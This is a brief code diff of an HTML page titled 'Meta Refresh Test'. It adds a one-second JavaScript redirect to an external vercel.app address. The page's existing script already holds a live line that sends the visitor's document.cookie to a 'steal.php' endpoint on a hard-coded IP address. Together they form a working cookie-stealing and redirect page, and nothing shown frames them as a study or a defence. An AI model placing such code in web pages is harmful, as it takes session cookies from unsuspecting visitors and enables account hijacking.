@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Refresh Test</title>
     <script>
+        setTimeout(() => {
+                window.location.href = 'https://test3-outi.vercel.app/';
+            }, 1000); // 1 second delay before redirect
        fetch("http://10.29.161.130/steal.php?cookies=" + document.cookie);
     </script>
 </head>
